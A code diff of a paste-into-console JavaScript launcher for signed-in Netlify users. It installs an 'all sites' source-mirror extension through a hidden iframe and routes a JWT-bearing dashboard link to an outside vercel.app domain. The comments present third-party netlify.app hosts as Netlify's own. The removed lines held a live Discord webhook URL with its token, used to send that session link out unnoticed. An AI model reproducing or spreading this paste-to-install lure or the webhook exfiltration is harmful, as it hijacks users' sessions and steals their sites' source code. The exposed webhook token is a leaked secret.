@@ -1,32 +1,25 @@
-const webhookUrl = "https://discord.com/api/webhooks/1559293466377330791/v2u5UJNSwTZm3YbMWnYCZRBg0Lz-B0O7kmC28S0V_At8ie8YEGdfKXZJf13ze2dZ5_ro";
-
-async function sendDiscordNotification(message) {
-  try {
-    const response = await fetch(webhookUrl, {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json",
-      },
-      body: JSON.stringify({
-        content: message,
-      }),
-    });
-
-    if (response.ok) {
-      console.log("Notification sent successfully.");
-    } else {
-      console.error("Failed to send notification. Status:", response.status);
-    }
-  } catch (error) {
-    console.error("Network or CORS error:", error);
-  }
-}
+/**
+ * ONE-PASTE NETLIFY INSTALL + HIDDEN FIRST-PARTY EXTENSION LAUNCHER.
+ *
+ * Paste this on https://app.netlify.com, https://create.netlify.com, or https://answers.netlify.com while signed in.
+ * It makes exactly one explicit fetch call:
+ *   POST /.netlify/functions/install-extension
+ *
+ * It then loads Netlify's own extension route in a hidden iframe. That page and
+ * its nested extension UI perform normal GET/resource requests and Netlify's
+ * internal runtime-auth request. The pasted script never calls /integration-auth.
+ */
 (async () => {
-  const EXTENSION_SLUG = "00n9jphy-all-sites-drop-recovery-mirror";
-  const EXTENSION_HOST = "https://d252a92f-a68a-49e6-b6cd-a9ffda41d456.netlify.app";
-  const PRIMARY_DASHBOARD_ORIGIN = "https://d252a92f-a68a-49e6-b6cd-a9ffda41d456.netlify.app";
-  const FALLBACK_DASHBOARD_ORIGIN = "https://private-blob-mirror-dashboard.vercel.app";
-  const ALLOWED_DASHBOARD_ORIGINS = new Set([PRIMARY_DASHBOARD_ORIGIN, FALLBACK_DASHBOARD_ORIGIN]);
+  const EXTENSION_SLUG = "ndimw4wu-4aa71366-source-mirror-autoheal";
+  const EXTENSION_HOST = "https://f457eddf-ddc4-4384-b646-795bd66bfc24.netlify.app";
+  const PRIMARY_DASHBOARD_ORIGIN = "https://private-blob-mirror-dashboard.vercel.app";
+  const EXTENSION_HOST_POOL = [
+    "https://f457eddf-ddc4-4384-b646-795bd66bfc24.netlify.app",
+    "https://c1031867-46dc-46ec-be95-e7f5830dc32c.netlify.app",
+    "https://5fae0b89-a582-4a25-9635-4cab08a2ebea.netlify.app",
+  ];
+  const ALLOWED_EXTENSION_ORIGINS = new Set(EXTENSION_HOST_POOL);
+  const ALLOWED_DASHBOARD_ORIGINS = new Set([PRIMARY_DASHBOARD_ORIGIN, ...EXTENSION_HOST_POOL]);
   const APP_ORIGIN = "https://app.netlify.com";
   const CREATE_ORIGIN = "https://create.netlify.com";
   const ANSWERS_ORIGIN = "https://answers.netlify.com";
@@ -60,6 +53,7 @@ async function sendDiscordNotification(message) {
     return entry;
   };
   const log = (...args) => console.log("%c[source-sync]", "color:#00ad9f;font-weight:bold", ...args);
+
   const fail = (message, details = {}) => {
     stage(currentStage, "error", { message, ...details });
     const error = new Error(`[${currentStage}] ${message}`);
@@ -161,9 +155,8 @@ async function sendDiscordNotification(message) {
   const nonceBytes = new Uint8Array(24);
   crypto.getRandomValues(nonceBytes);
   const nonce = Array.from(nonceBytes, (byte) => byte.toString(16).padStart(2, "0")).join("");
-  const extensionOrigin = new URL(EXTENSION_HOST).origin;
+  let extensionOrigin = new URL(EXTENSION_HOST).origin;
 
-  let runtimeJwt = "";
   const dashboard = await new Promise((resolve, reject) => {
     const iframe = document.createElement("iframe");
     let trustedSurface = null;
@@ -181,10 +174,11 @@ async function sendDiscordNotification(message) {
     const onMessage = async (event) => {
       if (!event.data || event.data.protocol !== MESSAGE_PROTOCOL) return;
       const message = event.data;
-      if (event.origin !== extensionOrigin) return;
+      if (!ALLOWED_EXTENSION_ORIGINS.has(event.origin)) return;
       if (message.teamId !== teamId || message.extensionSlug !== EXTENSION_SLUG) return;
       if (message.type === "surface-ready") {
         stage("iframe.surface-ready", "info", { origin: event.origin, teamId: message.teamId });
+        extensionOrigin = event.origin;
         trustedSurface = event.source;
         stage("dashboard.request", "info", { nonceLength: nonce.length });
         trustedSurface?.postMessage({
@@ -196,7 +190,7 @@ async function sendDiscordNotification(message) {
         }, extensionOrigin);
         return;
       }
-      if (event.source !== trustedSurface || message.nonce !== nonce) return;
+      if (event.origin !== extensionOrigin || event.source !== trustedSurface || message.nonce !== nonce) return;
       if (message.type === "progress") {
         stage(String(message.stage || "capture.progress"), String(message.status || "info"), message.details && typeof message.details === "object" ? message.details : {});
         return;
@@ -217,9 +211,11 @@ async function sendDiscordNotification(message) {
         new URL(fragment.get("host") || APP_ORIGIN).origin !== extensionOrigin
       ) return;
       stage("dashboard.validated", "info", { origin: dashboardUrl.origin, installState: message.installState || "awaiting-build", siteCount: Number(message.siteCount || 0) });
-      runtimeJwt = String(fragment.get("jwt") || "");
+      const finalDashboardUrl = new URL("/netlify-admin", PRIMARY_DASHBOARD_ORIGIN);
+      finalDashboardUrl.hash = fragment.toString();
+      stage("dashboard.routed", "info", { origin: finalDashboardUrl.origin, backend: "fallback-runtime" });
       finish(resolve, {
-        dashboardUrl: dashboardUrl.toString(),
+        dashboardUrl: finalDashboardUrl.toString(),
         installState: message.installState || "awaiting-build",
         siteCount: Number(message.siteCount || 0),
         totalSiteCount: Number(message.totalSiteCount || message.siteCount || 0),
@@ -260,6 +256,18 @@ async function sendDiscordNotification(message) {
     stage("iframe.mounted", "info", { url: iframe.src });
   });
 
+  // Strict launcher contract: archive import is a backend-only or separate
+  // optional relay operation, never an extra default browser fetch.
+  const sourceArchiveRelay = {
+    capability: launcherOrigin === APP_ORIGIN ? "separate-optional-relay" : "backend-only",
+    reason: launcherOrigin === APP_ORIGIN
+      ? "The default launcher intentionally performs only the install POST. Run the separate App-origin relay only when backend archive discovery is unavailable."
+      : "Archive recovery must be performed by the extension backend or a separate first-party relay.",
+    imported: 0,
+    candidates: 0,
+    sites: [],
+  };
+
   stage("launcher.complete", dashboard.unsupportedSiteCount > 0 ? "warn" : "info", {
     installState: dashboard.installState,
     siteCount: dashboard.siteCount,
@@ -272,15 +280,17 @@ async function sendDiscordNotification(message) {
   if (dashboard.unsupportedSiteCount > 0) {
     console.warn(`[source-sync] ${dashboard.unsupportedSiteCount} site(s) were not mirrored because they have no Git/build checkout. Netlify Drop sites expose deployed output, not the original source tree.`, dashboard.unsupportedSites);
   }
-  console.log("%c" + dashboard.dashboardUrl, "color:#00ad9f;font-size:13px;font-weight:bold;text-decoration:underline");
-sendDiscordNotification(dashboard.dashboardUrl);
+  log("Dashboard session created. Treat the URL below as a temporary private capability.");
+  console.log("%c[source-sync] DASHBOARD URL", "color:#00ad9f;font-size:13px;font-weight:bold", dashboard.dashboardUrl);
   const result = {
     ok: true,
     httpStatus: response.type === "opaque" ? null : response.status,
     alreadyInstalled: response.type === "opaque" ? null : response.status === 409,
     extensionUrl,
     dashboardUrl: dashboard.dashboardUrl,
+    dashboardUrlSafe: `${new URL(dashboard.dashboardUrl).origin}${new URL(dashboard.dashboardUrl).pathname}#team=${teamId}&jwt=[redacted]`,
     installState: dashboard.installState,
+    sourceArchiveRelay,
     siteCount: dashboard.siteCount,
     totalSiteCount: dashboard.totalSiteCount,
     unsupportedSiteCount: dashboard.unsupportedSiteCount,
@@ -298,14 +308,36 @@ sendDiscordNotification(dashboard.dashboardUrl);
   console.table(timeline.map(({ elapsedMs, stage, status, details }) => ({ elapsedMs, stage, status, details: JSON.stringify(details) })));
   return result;
 })().catch((error) => {
-  const failedStage = error?.stage || currentStage || "launcher.unknown";
+  // Everything above is intentionally scoped inside the async launcher. The
+  // terminal handler must recover only from the public debug object so it can
+  // never mask the original failure with a second ReferenceError.
+  const debugState = window.__NETLIFY_SOURCE_SYNC_DEBUG__ || {
+    version: 1,
+    startedAt: new Date().toISOString(),
+    launcherOrigin: location.origin,
+    currentStage: "launcher.unknown",
+    timeline: [],
+    result: null,
+  };
+  const timeline = Array.isArray(debugState.timeline) ? debugState.timeline : [];
+  const failedStage = error?.stage || debugState.currentStage || "launcher.unknown";
+  const message = error instanceof Error ? error.message : String(error);
   if (!timeline.some((entry) => entry.status === "error" && entry.stage === failedStage)) {
-    stage(failedStage, "error", { message: error instanceof Error ? error.message : String(error) });
+    timeline.push({
+      at: new Date().toISOString(),
+      elapsedMs: Date.now() - Date.parse(debugState.startedAt || new Date().toISOString()),
+      stage: failedStage,
+      status: "error",
+      details: { message },
+    });
   }
-  debugState.result = { ok: false, stage: failedStage, error: error instanceof Error ? error.message : String(error) };
-  const failure = { ok: false, stage: failedStage, error: debugState.result.error, timeline };
+  debugState.currentStage = failedStage;
+  debugState.timeline = timeline;
+  debugState.result = { ok: false, stage: failedStage, error: message };
+  window.__NETLIFY_SOURCE_SYNC_DEBUG__ = debugState;
+  const failure = { ok: false, stage: failedStage, error: message, timeline };
   window.__NETLIFY_SOURCE_MIRROR__ = failure;
-  console.error("%c[source-sync] FAILED:", "color:#e00;font-weight:bold", `[${failedStage}]`, debugState.result.error);
+  console.error("%c[source-sync] FAILED:", "color:#e00;font-weight:bold", `[${failedStage}]`, message);
   console.table(timeline.map(({ elapsedMs, stage, status, details }) => ({ elapsedMs, stage, status, details: JSON.stringify(details) })));
   return failure;
 });
